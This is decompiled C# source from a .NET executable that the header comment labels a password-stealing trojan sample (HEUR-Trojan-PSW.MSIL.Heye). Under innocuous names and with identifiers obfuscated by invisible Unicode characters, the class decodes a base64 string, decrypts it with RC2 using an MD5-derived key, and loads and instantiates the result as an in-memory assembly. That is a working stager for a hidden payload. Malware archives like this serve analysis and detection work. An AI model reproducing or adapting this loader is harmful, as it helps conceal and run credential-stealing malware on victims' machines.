// Decompiled with JetBrains decompiler
// Type: Restaurant.FallbackBuffer
// Assembly: CallerLineNumberAttribute, Version=1.0.0.16, Culture=neutral, PublicKeyToken=null
// MVID: 6F7D32F7-938D-4A8F-B05C-744106613F0A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-PSW.MSIL.Heye.gen-93aacab7e09044795808ad1a0256c015271653ab0fe9d62785800c0f19ef1ad8.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Restaurant
{
  public class FallbackBuffer
  {
    public FallbackBuffer(ushort a, int b, bool c, string FormatterTypeStyle) => this.WSTRBufferMarshaler(this.BStrWrapper(FallbackBuffer.\u206E‌‮⁭‏⁮‏⁫‍‭‌⁯⁬⁪⁬⁬‬⁭‏‬⁮‮‍‪‍‍​‮‫‎⁬‏⁪⁭‪⁭‫‍⁭⁫‮(FormatterTypeStyle)));

    public int WSTRBufferMarshaler(byte[] EqualityComparer)
    {
label_1:
      int num1 = -839505020;
      Type type;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -1523940971)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            type = FallbackBuffer.\u206A‪‏​‎‏⁯‮⁫⁪‎‏‬⁪‪⁮‎⁫‌⁫⁯‌‫‌‮‍‮​⁫‪‎‫⁮‬​⁬‮⁯⁯‎‮(FallbackBuffer.\u200F‏⁫‏‫‏⁫‏‍⁭​‌‫⁬⁫‫⁭‍‎⁯⁭⁪‮⁮‍‪‏​‬⁮‮‭⁮‍‮‏‪‭⁪⁫‮(FallbackBuffer.\u200B‫‫‌‏‬‎​⁫⁯⁫‍⁭‫⁪‬‏⁪‍‪‭‍⁫‏‫‏‍‌​‪‭⁫⁮​‮‪‌‭‫⁫‮(), EqualityComparer), \u003CModule\u003E.\u200B​‮‬‍‫‎⁮‍⁫​‌‎⁯‭‮‪⁫⁮‪‬⁯‏‏‭‍‮⁪⁬⁬‭‬‬‬⁭‪‌⁭⁭‮<string>(1919434338U));
            num1 = (int) num3 * -294702943 ^ 531976162;
            continue;
          case 2:
            FallbackBuffer.\u206C⁪‪‌‪‬⁮‏‎‍‎‬⁭‪‍⁮‌⁭⁯​⁯‫​‏‍‫‫‮⁬‏⁪‫⁭⁬⁭‌⁯‌‍⁯‮(type, new object[3]
            {
              (object) FormatterTypeStyle.ExclusiveScheduler,
              (object) FormatterTypeStyle.IdentityAuthority,
              (object) \u003CModule\u003E.\u202A‭⁬‍‏⁬‭‍‌⁯‏⁯‫⁯‬⁯​⁯⁯‮⁬‪‍⁯‮⁫‍‌⁯‮‮⁮⁫‫⁯‮⁭‮‍⁫‮<string>(1511054985U)
            });
            num1 = (int) num3 * 959447579 ^ 156659496;
            continue;
          case 3:
            num2 = 2048;
            num1 = (int) num3 * -2000883224 ^ -728879866;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return num2;
    }

    public byte[] BStrWrapper(byte[] B)
    {
      RC2CryptoServiceProvider cryptoServiceProvider1 = FallbackBuffer.\u206D‍⁪⁫⁪​‫⁭⁮‎⁫‍‎⁪⁫‫⁮⁪⁫‪‏⁯‭‏⁬‎‬⁭​⁬‏‬‎‮‮⁮‬‎‫⁮‮();
      MD5CryptoServiceProvider cryptoServiceProvider2 = FallbackBuffer.\u200D​‬‪‮‏⁭‌⁯⁭⁭‪‍‮⁪⁪⁮‎‭⁭‌‍​‭‎‭‌⁮‎‎⁫‬‪⁬‮‍‬​​⁮‮();
label_1:
      int num1 = -439277239;
      byte[] numArray1;
      byte[] numArray2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1154185464)) % 7U)
        {
          case 1:
            num1 = (int) num2 * 553580431 ^ -711611119;
            continue;
          case 2:
            FallbackBuffer.\u200E‬⁭‌⁭⁮⁯‬⁪​​⁫⁯⁫‭⁯‭​‭⁭‬‭‭​‮⁫⁪⁪⁮‭⁫‫‎‌⁬‭‪⁮⁯⁯‮((SymmetricAlgorithm) cryptoServiceProvider1, numArray2);
            num1 = (int) num2 * 348835590 ^ -7749487;
            continue;
          case 3:
            goto label_1;
          case 4:
            numArray2 = FallbackBuffer.\u200F‫‎‍‪‌⁯⁮‪‎⁭⁯‏⁮⁯‌‎‎‏⁭‮⁫⁮‌‍⁬⁭‮‭⁯⁪‍‎⁭‍‎‪‫⁬‮‮((HashAlgorithm) cryptoServiceProvider2, FallbackBuffer.\u206F‍‍​⁫‭⁮⁮‬⁪⁮‏‫‏‍‮‫‭⁯‎⁬‍‪‬‏⁬‮‌⁫⁭‮⁪‪⁪‮​⁭‬⁭‬‮(FallbackBuffer.\u200D⁯⁪‌​‬⁪‮‭‬⁬⁭⁬⁯‏‍​‎⁬‎‌‍‏⁮‪‎‭‍⁫⁪⁬‏‪‭⁯‭‬⁭⁪‮‮(), \u003CModule\u003E.\u202C‭⁬‎⁪⁭‍​‭⁪‫‬‮​⁬‮​‬⁫⁭‮​⁬‭‏‮⁯‍⁬⁮⁮⁫⁯‪‪‌‭⁬‍‬‮<string>(2177239383U)));
            num1 = (int) num2 * -33713370 ^ -438604981;
            continue;
          case 5:
            FallbackBuffer.\u200E‏‭⁭⁫​‬⁬⁪⁮⁭‪‫‫‮‭⁯​⁭‮‎‎‮‏‌⁮‎‬‍⁬​⁬⁬​⁪​‬⁭⁬‮‮((SymmetricAlgorithm) cryptoServiceProvider1, CipherMode.ECB);
            num1 = (int) num2 * -409949508 ^ 1845162710;
            continue;
          case 6:
            numArray1 = FallbackBuffer.\u200B​‏​‮‍‍⁭⁯⁯⁬‌‮‮​⁭⁪‎⁮⁫​⁬⁬‭⁫‪‮‬⁮‌⁭‏‪​‎⁭⁪⁯⁬⁬‮(FallbackBuffer.\u206E‌‏‌‏‎‎‮‏‎‫‏⁫⁯‌⁭‪⁫‬‏‮⁯⁯‎‪⁯⁮⁬⁪‎‬‭‍‬‍‍‎‏⁮‪‮((SymmetricAlgorithm) cryptoServiceProvider1), B, 0, B.Length);
            num1 = (int) num2 * 318727620 ^ 554659885;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return numArray1;
    }

    static byte[] \u206E‌‮⁭‏⁮‏⁫‍‭‌⁯⁬⁪⁬⁬‬⁭‏‬⁮‮‍‪‍‍​‮‫‎⁬‏⁪⁭‪⁭‫‍⁭⁫‮([In] string obj0) => Convert.FromBase64String(obj0);

    static AppDomain \u200B‫‫‌‏‬‎​⁫⁯⁫‍⁭‫⁪‬‏⁪‍‪‭‍⁫‏‫‏‍‌​‪‭⁫⁮​‮‪‌‭‫⁫‮() => Thread.GetDomain();

    static Assembly \u200F‏⁫‏‫‏⁫‏‍⁭​‌‫⁬⁫‫⁭‍‎⁯⁭⁪‮⁮‍‪‏​‬⁮‮‭⁮‍‮‏‪‭⁪⁫‮(
      [In] AppDomain obj0,
      [In] byte[] obj1)
    {
      return obj0.Load(obj1);
    }

    static Type \u206A‪‏​‎‏⁯‮⁫⁪‎‏‬⁪‪⁮‎⁫‌⁫⁯‌‫‌‮‍‮​⁫‪‎‫⁮‬​⁬‮⁯⁯‎‮([In] Assembly obj0, [In] string obj1) => obj0.GetType(obj1);

    static object \u206C⁪‪‌‪‬⁮‏‎‍‎‬⁭‪‍⁮‌⁭⁯​⁯‫​‏‍‫‫‮⁬‏⁪‫⁭⁬⁭‌⁯‌‍⁯‮([In] Type obj0, [In] object[] obj1) => Activator.CreateInstance(obj0, obj1);

    static RC2CryptoServiceProvider \u206D‍⁪⁫⁪​‫⁭⁮‎⁫‍‎⁪⁫‫⁮⁪⁫‪‏⁯‭‏⁬‎‬⁭​⁬‏‬‎‮‮⁮‬‎‫⁮‮() => new RC2CryptoServiceProvider();

    static MD5CryptoServiceProvider \u200D​‬‪‮‏⁭‌⁯⁭⁭‪‍‮⁪⁪⁮‎‭⁭‌‍​‭‎‭‌⁮‎‎⁫‬‪⁬‮‍‬​​⁮‮() => new MD5CryptoServiceProvider();

    static Encoding \u200D⁯⁪‌​‬⁪‮‭‬⁬⁭⁬⁯‏‍​‎⁬‎‌‍‏⁮‪‎‭‍⁫⁪⁬‏‪‭⁯‭‬⁭⁪‮‮() => Encoding.BigEndianUnicode;

    static byte[] \u206F‍‍​⁫‭⁮⁮‬⁪⁮‏‫‏‍‮‫‭⁯‎⁬‍‪‬‏⁬‮‌⁫⁭‮⁪‪⁪‮​⁭‬⁭‬‮([In] Encoding obj0, [In] string obj1) => obj0.GetBytes(obj1);

    static byte[] \u200F‫‎‍‪‌⁯⁮‪‎⁭⁯‏⁮⁯‌‎‎‏⁭‮⁫⁮‌‍⁬⁭‮‭⁯⁪‍‎⁭‍‎‪‫⁬‮‮([In] HashAlgorithm obj0, [In] byte[] obj1) => obj0.ComputeHash(obj1);

    static void \u200E‬⁭‌⁭⁮⁯‬⁪​​⁫⁯⁫‭⁯‭​‭⁭‬‭‭​‮⁫⁪⁪⁮‭⁫‫‎‌⁬‭‪⁮⁯⁯‮([In] SymmetricAlgorithm obj0, [In] byte[] obj1) => obj0.Key = obj1;

    static void \u200E‏‭⁭⁫​‬⁬⁪⁮⁭‪‫‫‮‭⁯​⁭‮‎‎‮‏‌⁮‎‬‍⁬​⁬⁬​⁪​‬⁭⁬‮‮(
      [In] SymmetricAlgorithm obj0,
      [In] CipherMode obj1)
    {
      obj0.Mode = obj1;
    }

    static ICryptoTransform \u206E‌‏‌‏‎‎‮‏‎‫‏⁫⁯‌⁭‪⁫‬‏‮⁯⁯‎‪⁯⁮⁬⁪‎‬‭‍‬‍‍‎‏⁮‪‮(
      [In] SymmetricAlgorithm obj0)
    {
      return obj0.CreateDecryptor();
    }

    static byte[] \u200B​‏​‮‍‍⁭⁯⁯⁬‌‮‮​⁭⁪‎⁮⁫​⁬⁬‭⁫‪‮‬⁮‌⁭‏‪​‎⁭⁪⁯⁬⁬‮(
      [In] ICryptoTransform obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      return obj0.TransformFinalBlock(obj1, obj2, obj3);
    }
  }
}
